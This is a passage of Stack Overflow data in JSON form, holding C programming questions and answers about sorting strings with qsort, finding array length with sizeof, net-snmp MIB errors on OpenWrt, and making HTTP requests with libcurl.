100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "reply_to_user": {"reputation": 35932, "user_id": 1606345, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/IwiIM.png?s=128&g=1", "display_name": "David Ranieri", "link": "https://stackoverflow.com/users/1606345/david-ranieri"}, "edited": false, "score": 0, "creation_date": 1459334867, "post_id": 36306329, "comment_id": 60236709, "body": "@AlterMann Thanks. I honestly though that was a placeholder for the real comparison function."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 1, "creation_date": 1459334927, "post_id": 36306329, "comment_id": 60236758, "body": "Step through the code and watch the value of <code>i</code> in your debugger. Should take you less than 5 minutes to find the bug."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1459335338, "post_id": 36306329, "comment_id": 60237040, "body": "What do you pass to <code>sort_string_array</code>, how is it defined and initialised?"}, {"owner": {"reputation": 177, "user_id": 4670751, "user_type": "registered", "accept_rate": 19, "profile_image": "https://www.gravatar.com/avatar/a038f58ecda23b30db8e6e7a3e86b20b?s=128&d=identicon&r=PG&f=1", "display_name": "Duzzz", "link": "https://stackoverflow.com/users/4670751/duzzz"}, "edited": false, "score": 0, "creation_date": 1459335769, "post_id": 36306329, "comment_id": 60237343, "body": "<a href=\"https://codeshare.io/VHcbP\" rel=\"nofollow noreferrer\">codeshare.io/VHcbP</a>"}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1459336111, "post_id": 36306329, "comment_id": 60237583, "body": "Related: <a href=\"http://stackoverflow.com/q/14993282/694576\">stackoverflow.com/q/14993282/694576</a>"}, {"owner": {"reputation": 177, "user_id": 4670751, "user_type": "registered", "accept_rate": 19, "profile_image": "https://www.gravatar.com/avatar/a038f58ecda23b30db8e6e7a3e86b20b?s=128&d=identicon&r=PG&f=1", "display_name": "Duzzz", "link": "https://stackoverflow.com/users/4670751/duzzz"}, "edited": false, "score": 0, "creation_date": 1459336498, "post_id": 36306329, "comment_id": 60237865, "body": "Hey thanks, I will try with those helps!"}], "answers": [{"comments": [{"owner": {"reputation": 177, "user_id": 4670751, "user_type": "registered", "accept_rate": 19, "profile_image": "https://www.gravatar.com/avatar/a038f58ecda23b30db8e6e7a3e86b20b?s=128&d=identicon&r=PG&f=1", "display_name": "Duzzz", "link": "https://stackoverflow.com/users/4670751/duzzz"}, "edited": false, "score": 0, "creation_date": 1459334944, "post_id": 36306511, "comment_id": 60236772, "body": "Oh my, what an stypid mistake I made, thanks a lot :)"}], "tags": [], "owner": {"reputation": 35932, "user_id": 1606345, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/IwiIM.png?s=128&g=1", "display_name": "David Ranieri", "link": "https://stackoverflow.com/users/1606345/david-ranieri"}, "is_accepted": false, "score": 2, "last_activity_date": 1459337497, "last_edit_date": 1459337497, "creation_date": 1459334736, "answer_id": 36306511, "question_id": 36306329, "link": "https://stackoverflow.com/questions/36306329/sorting-string-arrays/36306511#36306511", "title": "Sorting string arrays", "body": "<p>You are using one more item and probably accessing outside the bounds of array</p>\n\n<pre><code>while (table[i++] != NULL);  \n</code></pre>\n\n<p>should be</p>\n\n<pre><code>while (table[i] != NULL) i++;  \n</code></pre>\n\n<p>There is a <a href=\"http://c-faq.com/lib/qsort1.html\" rel=\"nofollow\">reference</a> in the C-FAQ about using <code>qsort</code> and <code>strcmp</code>:</p>\n\n<p><strong>Q</strong>: I'm trying to sort an array of strings with qsort, using strcmp as the comparison function, but it's not working.</p>\n\n<p><strong>A</strong>: By array of strings you probably mean array of pointers to char. The arguments to qsort's comparison function are pointers to the objects being sorted, in this case, pointers to pointers to char. strcmp, however, accepts simple pointers to char. Therefore, strcmp can't be used directly. Write an intermediate comparison function like this:</p>\n\n<pre><code>/* compare strings via pointers */\nint pstrcmp(const void *p1, const void *p2)\n{\n    return strcmp(*(char * const *)p1, *(char * const *)p2);\n}\n</code></pre>\n\n<p>The comparison function's arguments are expressed as generic pointers, const void *. They are converted back to what they really are (pointers to pointers to char) and dereferenced, yielding char *'s which can be passed to strcmp.</p>\n\n<p>The call to qsort might look like</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\nchar *strings[NSTRINGS];\nint nstrings;\n/* nstrings cells of strings[] are to be sorted */\nqsort(strings, nstrings, sizeof(char *), pstrcmp);\n</code></pre>\n\n<p>(Don't be misled by the discussion in K&amp;R2 Sec. 5.11 pp. 119-20, which is not discussing the Standard library's qsort, and makes a quiet, unnecessary assumption about the equivalence of char * and void *).</p>\n\n<p>For more information on qsort comparison functions--how they are called and how they must be declared--see question 13.9.</p>\n\n<p>References: ISO Sec. 7.10.5.2\nH&amp;S Sec. 20.5 p. 419 </p>\n"}], "owner": {"reputation": 177, "user_id": 4670751, "user_type": "registered", "accept_rate": 19, "profile_image": "https://www.gravatar.com/avatar/a038f58ecda23b30db8e6e7a3e86b20b?s=128&d=identicon&r=PG&f=1", "display_name": "Duzzz", "link": "https://stackoverflow.com/users/4670751/duzzz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 116, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1459337497, "creation_date": 1459334188, "last_edit_date": 1459335185, "question_id": 36306329, "link": "https://stackoverflow.com/questions/36306329/sorting-string-arrays", "title": "Sorting string arrays", "body": "<p>I am doing a school project with arrays using C. At the moment I am trying to sort the array of string to alphabetical order. I just can't seem to successfully do this. Here is the simplified code that I have done so far:</p>\n\n<pre><code>void sort_string_array(char **table)\n{\n    int i = 0;\n    while (table[i++] != NULL);                // to get the length\n    qsort(table, i, sizeof(char *), strcmp);   // sorting\n}\n</code></pre>\n\n<p>Is this a completely wrong solution style, am I close, what is wrong :P ? Any help would be awesome!</p>\n\n<p>EDIT: </p>\n\n<pre><code>void sort_string_array(char **table)\n{\n    int i = 0;\n    while (table[i] != NULL) i++;              // to get the length\n    qsort(table, i, sizeof(char *), strcmp);   // sorting\n}\n</code></pre>\n\n<p>After correcting that error it is still not fuctioning right. Using string {'one','two','three','four'} first value of this sort should be 'four' but it is 'two'}</p>\n"}, {"tags": ["c", "openwrt", "net-snmp"], "answers": [{"comments": [{"owner": {"reputation": 39, "user_id": 6129105, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/16c4596b022b526e94b5b18aa041a11b?s=128&d=identicon&r=PG&f=1", "display_name": "kewal", "link": "https://stackoverflow.com/users/6129105/kewal"}, "edited": false, "score": 0, "creation_date": 1460528596, "post_id": 36579802, "comment_id": 60778087, "body": "actually I solved the issue. Turns out net-snmp does not create a snmp.conf file by default when the package is installed in openwrt environment. I just created an snmp.conf file with one entry mibs and the error stopped popping. Anyways thanks for your time"}, {"owner": {"reputation": 35130, "user_id": 1255289, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/5ed02658b2440179f00eeff8beb7aa4c?s=128&d=identicon&r=PG", "display_name": "miken32", "link": "https://stackoverflow.com/users/1255289/miken32"}, "reply_to_user": {"reputation": 39, "user_id": 6129105, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/16c4596b022b526e94b5b18aa041a11b?s=128&d=identicon&r=PG&f=1", "display_name": "kewal", "link": "https://stackoverflow.com/users/6129105/kewal"}, "edited": false, "score": 0, "creation_date": 1460557350, "post_id": 36579802, "comment_id": 60799612, "body": "Then you should delete your question, or post your own answer."}], "tags": [], "owner": {"reputation": 35130, "user_id": 1255289, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/5ed02658b2440179f00eeff8beb7aa4c?s=128&d=identicon&r=PG", "display_name": "miken32", "link": "https://stackoverflow.com/users/1255289/miken32"}, "is_accepted": false, "score": 0, "last_activity_date": 1460480864, "creation_date": 1460480864, "answer_id": 36579802, "question_id": 36306080, "link": "https://stackoverflow.com/questions/36306080/error-while-running-snmpget-from-net-snmp-c-package/36579802#36579802", "title": "Error while running snmpget from net-snmp C package", "body": "<p>You need to install the missing MIBs specified in the error message, or disable MIB errors with <a href=\"http://www.net-snmp.org/docs/man/snmpcmd.html#lbAG\" rel=\"nofollow\">the appropriate option</a>:</p>\n\n<pre><code>snmpget -Pe ...\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 39, "user_id": 6129105, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/16c4596b022b526e94b5b18aa041a11b?s=128&d=identicon&r=PG&f=1", "display_name": "kewal", "link": "https://stackoverflow.com/users/6129105/kewal"}, "is_accepted": false, "score": 1, "last_activity_date": 1524024466, "last_edit_date": 1524024466, "creation_date": 1460632086, "answer_id": 36621277, "question_id": 36306080, "link": "https://stackoverflow.com/questions/36306080/error-while-running-snmpget-from-net-snmp-c-package/36621277#36621277", "title": "Error while running snmpget from net-snmp C package", "body": "<p>The easiest way to stop this error from popping would be to create an <strong>snmp.conf</strong> file in <em>/etc/snmp</em> folder (if it is not created already) and add the following line</p>\n\n<pre><code>mibs : \n</code></pre>\n\n<p>it should solve the issue. </p>\n"}], "owner": {"reputation": 39, "user_id": 6129105, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/16c4596b022b526e94b5b18aa041a11b?s=128&d=identicon&r=PG&f=1", "display_name": "kewal", "link": "https://stackoverflow.com/users/6129105/kewal"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 709, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1524024466, "creation_date": 1459333547, "last_edit_date": 1459335590, "question_id": 36306080, "link": "https://stackoverflow.com/questions/36306080/error-while-running-snmpget-from-net-snmp-c-package", "title": "Error while running snmpget from net-snmp C package", "body": "<p>I have written a C-program using net-snmp C package. When I run that program on my laptop, I get the result alright. But when I run the same program on Cloudgate (an openwrt enabled gateway device), I get the following error along with my reuslt</p>\n\n<blockquote>\n  <p>No log handling enabled - turning on stderr logging</p>\n  \n  <p>Cannot find module (IP-MIB): At line 0 in (none)</p>\n  \n  <p>Cannot find module (IF-MIB): At line 0 in (none)</p>\n  \n  <p>Cannot find module (TCP-MIB): At line 0 in (none)</p>\n  \n  <p>Cannot find module (UDP-MIB): At line 0 in (none)</p>\n  \n  <p>Cannot find module (HOST-RESOURCES-MIB): At line 0 in (none)</p>\n  \n  <p>Cannot find module (SNMPv2-MIB): At line 0 in (none)</p>\n  \n  <p>Cannot find module (SNMPv2-SMI): At line 0 in (none)</p>\n  \n  <p>Cannot find module (NOTIFICATION-LOG-MIB): At line 0 in (none)</p>\n  \n  <p>Cannot find module (DISMAN-EVENT-MIB): At line 0 in (none)</p>\n  \n  <p>Cannot find module (DISMAN-SCHEDULE-MIB): At line 0 in (none)</p>\n  \n  <p>Cannot find module (UCD-SNMP-MIB): At line 0 in (none)</p>\n  \n  <p>Cannot find module (UCD-DEMO-MIB): At line 0 in (none)</p>\n  \n  <p>Cannot find module (SNMP-TARGET-MIB): At line 0 in (none)</p>\n  \n  <p>Cannot find module (NET-SNMP-AGENT-MIB): At line 0 in (none)</p>\n  \n  <p>Cannot find module (HOST-RESOURCES-TYPES): At line 0 in (none)</p>\n  \n  <p>Cannot find module (SNMP-FRAMEWORK-MIB): At line 0 in (none)</p>\n  \n  <p>Cannot find module (SNMP-MPD-MIB): At line 0 in (none)</p>\n  \n  <p>Cannot find module (SNMP-USER-BASED-SM-MIB): At line 0 in (none)</p>\n  \n  <p>Cannot find module (SNMP-VIEW-BASED-ACM-MIB): At line 0 in (none)</p>\n  \n  <p>Cannot find module (SNMP-COMMUNITY-MIB): At line 0 in (none)</p>\n  \n  <p>Cannot find module (IP-FORWARD-MIB): At line 0 in (none)</p>\n  \n  <p>Cannot find module (NET-SNMP-EXTEND-MIB): At line 0 in (none)</p>\n  \n  <p>Cannot find module (UCD-DLMOD-MIB): At line 0 in (none)</p>\n  \n  <p>Cannot find module (SNMP-NOTIFICATION-MIB): At line 0 in (none)</p>\n  \n  <p>Cannot find module (SNMPv2-TM): At line 0 in (none)</p>\n  \n  <p>Cannot find module (NET-SNMP-VACM-MIB): At line 0 in (none)</p>\n</blockquote>\n\n<p>How should I handle it?</p>\n\n<p>P.S. I am installing net-snmp in that device using makefile from the site</p>\n\n<p>\u200b<a href=\"https://dev.openwrt.org/browser/packages/net/net-snmp/Makefile?rev=25486\" rel=\"nofollow\">https://dev.openwrt.org/browser/packages/net/net-snmp/Makefile?rev=25486</a></p>\n"}, {"tags": ["c", "arrays"], "comments": [{"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1459332289, "post_id": 36305453, "comment_id": 60234861, "body": "Use <code>%zu</code> to print <code>size_t</code> values"}, {"owner": {"reputation": 21, "user_id": 6127617, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33603460d4f5c19072a55bde77809025?s=128&d=identicon&r=PG&f=1", "display_name": "Isaac", "link": "https://stackoverflow.com/users/6127617/isaac"}, "reply_to_user": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1459333108, "post_id": 36305453, "comment_id": 60235478, "body": "Thank you for the answers everyone, I see the issue now. I&#39;ll keep trying and get back if I find a solution :)"}], "answers": [{"comments": [{"owner": {"reputation": 8251, "user_id": 2912665, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/XrRhd.jpg?s=128&g=1", "display_name": "CinCout", "link": "https://stackoverflow.com/users/2912665/cincout"}, "edited": false, "score": 0, "creation_date": 1459332232, "post_id": 36305519, "comment_id": 60234816, "body": "&quot;You&#39;ll have to pass the size of the array as a parameter.&quot; That&#39;s what the OP wants to calculate!"}, {"owner": {"reputation": 4352, "user_id": 2483038, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/cdaf35803110c235e3122cb85c113131?s=128&d=identicon&r=PG&f=1", "display_name": "blazs", "link": "https://stackoverflow.com/users/2483038/blazs"}, "reply_to_user": {"reputation": 8251, "user_id": 2912665, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/XrRhd.jpg?s=128&g=1", "display_name": "CinCout", "link": "https://stackoverflow.com/users/2912665/cincout"}, "edited": false, "score": 0, "creation_date": 1459332492, "post_id": 36305519, "comment_id": 60235020, "body": "@HappyCoder I know, I&#39;m just saying he&#39;ll have to provide the size somehow, because he won&#39;t be able to compute from the pointer."}, {"owner": {"reputation": 4888, "user_id": 5785362, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a786fd81952576dc07942023bf8830b?s=128&d=identicon&r=PG", "display_name": "tofro", "link": "https://stackoverflow.com/users/5785362/tofro"}, "edited": false, "score": 0, "creation_date": 1459332516, "post_id": 36305519, "comment_id": 60235043, "body": "Where C &quot;sees&quot; the array in its original array form (that is, in <code>main</code>()`), the array size is actually easy to calculate - and the OP seems to know how that is done."}], "tags": [], "owner": {"reputation": 4352, "user_id": 2483038, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/cdaf35803110c235e3122cb85c113131?s=128&d=identicon&r=PG&f=1", "display_name": "blazs", "link": "https://stackoverflow.com/users/2483038/blazs"}, "is_accepted": false, "score": 1, "last_activity_date": 1459332158, "creation_date": 1459332158, "answer_id": 36305519, "question_id": 36305453, "link": "https://stackoverflow.com/questions/36305453/c-print-array-length/36305519#36305519", "title": "c print array length", "body": "<p>The array gets decayed into a pointer in the function argument and you thus can't find the size of the array from the function.</p>\n\n<p>You'll have to pass the size of the array as a parameter.</p>\n"}, {"tags": [], "owner": {"reputation": 8813, "user_id": 1812788, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Zn2AX.jpg?s=128&g=1", "display_name": "Tam&#225;s Zahola", "link": "https://stackoverflow.com/users/1812788/tam%c3%a1s-zahola"}, "is_accepted": true, "score": 5, "last_activity_date": 1459332290, "creation_date": 1459332290, "answer_id": 36305581, "question_id": 36305453, "link": "https://stackoverflow.com/questions/36305453/c-print-array-length/36305581#36305581", "title": "c print array length", "body": "<p><code>sizeof</code> can only compute the size of an array if it's size is known in that scope. E.g.:</p>\n\n<pre><code>double array[10];\nprintf(\"%d\", sizeof(array) / sizeof(double)); // prints 10\n</code></pre>\n\n<p>However:</p>\n\n<pre><code>void printSize(double array[]) {\n    printf(\"%d\", sizeof(array) / sizeof(double)); // doesn't print 10\n}\n</code></pre>\n\n<p>Because here <code>double array[]</code> is just syntactic sugar for <code>double* array</code>. </p>\n"}], "owner": {"reputation": 21, "user_id": 6127617, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33603460d4f5c19072a55bde77809025?s=128&d=identicon&r=PG&f=1", "display_name": "Isaac", "link": "https://stackoverflow.com/users/6127617/isaac"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 13430, "favorite_count": 1, "closed_date": 1459332448, "accepted_answer_id": 36305581, "answer_count": 2, "score": 1, "last_activity_date": 1459332623, "creation_date": 1459331989, "last_edit_date": 1459332623, "question_id": 36305453, "link": "https://stackoverflow.com/questions/36305453/c-print-array-length", "closed_reason": "Duplicate", "title": "c print array length", "body": "<p>as part of a larger task I'm trying to print the length of an array in C, i.e how many elements are in an array. The array is an array of doubles, and I want to print a single integer which is how many doubles are in the array.\nI have this code:</p>\n\n<pre><code>int array_length( double array[] ) {\n    double length = 0;\n    length = sizeof(array) / sizeof(double);\n    printf(\"%G\", length);\n    return 0;\n}\n</code></pre>\n\n<p>and I call it in main like this:</p>\n\n<pre><code>int main( void ) {\n    double test[] = {1.1,2.2,3.3,4.4,5.5};\n    array_length(test);\n    return 0;\n}\n</code></pre>\n\n<p>however this returns the error:</p>\n\n<blockquote>\n  <p>error: \u2018sizeof\u2019 on array function parameter \u2018array\u2019 will return size\n  of \u2018double *\u2019 [-Werror=sizeof-array-argument]</p>\n</blockquote>\n\n<p>research has told me that </p>\n\n<pre><code>sizeof(array) / sizeof(double);\n</code></pre>\n\n<p>will give me the length of an array, and I am trying to using \"%G\" to allow me to print the double that this code returns.</p>\n\n<p>I believe that \"double*\" means long double, so I tried changing \"%G\" to \"%LG\" and all uses of \"double\" to \"long double\", but that did not solve the problem. What is going on here?</p>\n"}, {"tags": ["c++", "c", "json", "curl", "libcurl"], "comments": [{"owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "edited": false, "score": 0, "creation_date": 1459332511, "post_id": 36305340, "comment_id": 60235038, "body": "Why are you calling perform twice?"}, {"owner": {"reputation": 190, "user_id": 3572440, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/36ad6196b737e2d4513b4b7ba2f367a8?s=128&d=identicon&r=PG&f=1", "display_name": "Zero", "link": "https://stackoverflow.com/users/3572440/zero"}, "reply_to_user": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "edited": false, "score": 0, "creation_date": 1459332713, "post_id": 36305340, "comment_id": 60235188, "body": "@2501 First call to authenticate second call to do the work."}, {"owner": {"reputation": 6841, "user_id": 1190965, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/3e74ed8e572542a718df5f15ead40581?s=128&d=identicon&r=PG", "display_name": "nodakai", "link": "https://stackoverflow.com/users/1190965/nodakai"}, "edited": false, "score": 0, "creation_date": 1459333072, "post_id": 36305340, "comment_id": 60235451, "body": "<code>curl --user user:password &quot;http:&#47;&#47;sub.domain.com&#47;rest&#47;getdiscounts?supermarketid=5323&quot;</code> this looks like a GET request while you construct a POST request, isn&#39;t it odd?"}, {"owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "edited": false, "score": 0, "creation_date": 1459333320, "post_id": 36305340, "comment_id": 60235631, "body": "@Zero The same mistake is in the article in the link you posted."}, {"owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "edited": false, "score": 0, "creation_date": 1459333590, "post_id": 36305340, "comment_id": 60235822, "body": "@Zero I don&#39;t see any need to call perform twice in this case. Either way you don&#39;t check the result of the first call which might have failed."}, {"owner": {"reputation": 190, "user_id": 3572440, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/36ad6196b737e2d4513b4b7ba2f367a8?s=128&d=identicon&r=PG&f=1", "display_name": "Zero", "link": "https://stackoverflow.com/users/3572440/zero"}, "reply_to_user": {"reputation": 6841, "user_id": 1190965, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/3e74ed8e572542a718df5f15ead40581?s=128&d=identicon&r=PG", "display_name": "nodakai", "link": "https://stackoverflow.com/users/1190965/nodakai"}, "edited": false, "score": 0, "creation_date": 1459333650, "post_id": 36305340, "comment_id": 60235862, "body": "@nodakai Yes this is true, and yes this is odd. I do not really understand how to properly do a get request with curl in C++."}, {"owner": {"reputation": 43751, "user_id": 93747, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dbf187b5b45c400649ed7f946e8f00d6?s=128&d=identicon&r=PG", "display_name": "Daniel Stenberg", "link": "https://stackoverflow.com/users/93747/daniel-stenberg"}, "edited": false, "score": 0, "creation_date": 1459335631, "post_id": 36305340, "comment_id": 60237255, "body": "add <code>--libcurl code.c</code> to your curl command line and your job is done"}, {"owner": {"reputation": 6841, "user_id": 1190965, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/3e74ed8e572542a718df5f15ead40581?s=128&d=identicon&r=PG", "display_name": "nodakai", "link": "https://stackoverflow.com/users/1190965/nodakai"}, "reply_to_user": {"reputation": 43751, "user_id": 93747, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dbf187b5b45c400649ed7f946e8f00d6?s=128&d=identicon&r=PG", "display_name": "Daniel Stenberg", "link": "https://stackoverflow.com/users/93747/daniel-stenberg"}, "edited": false, "score": 0, "creation_date": 1459336858, "post_id": 36305340, "comment_id": 60238137, "body": "@DanielStenberg MAGNIFICENT, I didn&#39;t know this feature"}, {"owner": {"reputation": 190, "user_id": 3572440, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/36ad6196b737e2d4513b4b7ba2f367a8?s=128&d=identicon&r=PG&f=1", "display_name": "Zero", "link": "https://stackoverflow.com/users/3572440/zero"}, "edited": false, "score": 0, "creation_date": 1459338993, "post_id": 36305340, "comment_id": 60239643, "body": "Thanks for all the comments, I figured it out now!"}, {"owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "edited": false, "score": 0, "creation_date": 1459341592, "post_id": 36305340, "comment_id": 60241501, "body": "@Zero What was your solution?"}, {"owner": {"reputation": 190, "user_id": 3572440, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/36ad6196b737e2d4513b4b7ba2f367a8?s=128&d=identicon&r=PG&f=1", "display_name": "Zero", "link": "https://stackoverflow.com/users/3572440/zero"}, "reply_to_user": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "edited": false, "score": 0, "creation_date": 1459342550, "post_id": 36305340, "comment_id": 60242214, "body": "@2501 I have placed the working code in the OP"}, {"owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "edited": false, "score": 0, "creation_date": 1459342692, "post_id": 36305340, "comment_id": 60242327, "body": "@Zero Did you read my answer? If you didn&#39;t please do."}], "answers": [{"comments": [{"owner": {"reputation": 190, "user_id": 3572440, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/36ad6196b737e2d4513b4b7ba2f367a8?s=128&d=identicon&r=PG&f=1", "display_name": "Zero", "link": "https://stackoverflow.com/users/3572440/zero"}, "edited": false, "score": 0, "creation_date": 1459342789, "post_id": 36305811, "comment_id": 60242414, "body": "Why is this needed?\\"}, {"owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "reply_to_user": {"reputation": 190, "user_id": 3572440, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/36ad6196b737e2d4513b4b7ba2f367a8?s=128&d=identicon&r=PG&f=1", "display_name": "Zero", "link": "https://stackoverflow.com/users/3572440/zero"}, "edited": false, "score": 0, "creation_date": 1459342857, "post_id": 36305811, "comment_id": 60242471, "body": "@Zero I&#39;m not sure what do you mean by that. Which part is not clear? I explained the problem in the answer."}, {"owner": {"reputation": 190, "user_id": 3572440, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/36ad6196b737e2d4513b4b7ba2f367a8?s=128&d=identicon&r=PG&f=1", "display_name": "Zero", "link": "https://stackoverflow.com/users/3572440/zero"}, "edited": false, "score": 0, "creation_date": 1459342936, "post_id": 36305811, "comment_id": 60242539, "body": "I mean what is causing the undefined behavoiur when I set lastResponse directly?"}, {"owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "reply_to_user": {"reputation": 190, "user_id": 3572440, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/36ad6196b737e2d4513b4b7ba2f367a8?s=128&d=identicon&r=PG&f=1", "display_name": "Zero", "link": "https://stackoverflow.com/users/3572440/zero"}, "edited": false, "score": 0, "creation_date": 1459342987, "post_id": 36305811, "comment_id": 60242591, "body": "@Zero The line <code>lastResponse += (const char*)ptr;</code> is causing undefined behavior, more specifically the underlying call to the overloaded operator."}], "tags": [], "owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "is_accepted": false, "score": 0, "last_activity_date": 1459333716, "last_edit_date": 1459333716, "creation_date": 1459332824, "answer_id": 36305811, "question_id": 36305340, "link": "https://stackoverflow.com/questions/36305340/how-to-make-a-libcurl-http-webrequest/36305811#36305811", "title": "How to make a libcurl HTTP webrequest?", "body": "<p>The first argument <code>ptr</code> of the  CURLOPT_WRITEFUNCTION <a href=\"https://curl.haxx.se/libcurl/c/CURLOPT_WRITEFUNCTION.html\" rel=\"nofollow\">callback</a> function <code>server_response_stream</code>, points to the data received. That data is not null terminated.</p>\n\n<p>The string <code>+=</code> <a href=\"http://www.cplusplus.com/reference/string/string/operator+=/\" rel=\"nofollow\">operator</a> must receive a pointer to a null terminated string.</p>\n\n<p>The call <code>lastResponse += (const char*)ptr;</code> is causing undefined behavior. The bytes will have to be appended to the string in a different way. You can append the string character by character, using the arguments <code>size</code> and <code>nmemb</code> to determine the size of the buffer.</p>\n"}], "owner": {"reputation": 190, "user_id": 3572440, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/36ad6196b737e2d4513b4b7ba2f367a8?s=128&d=identicon&r=PG&f=1", "display_name": "Zero", "link": "https://stackoverflow.com/users/3572440/zero"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 216, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1459342499, "creation_date": 1459331715, "last_edit_date": 1495541733, "question_id": 36305340, "link": "https://stackoverflow.com/questions/36305340/how-to-make-a-libcurl-http-webrequest", "title": "How to make a libcurl HTTP webrequest?", "body": "<p>I am trying to get json data from a url:</p>\n\n<pre><code>sub.domain.com/rest/getdiscounts?supermarketid=5323\n</code></pre>\n\n<p>I want to get the data returned from that url. In terminal 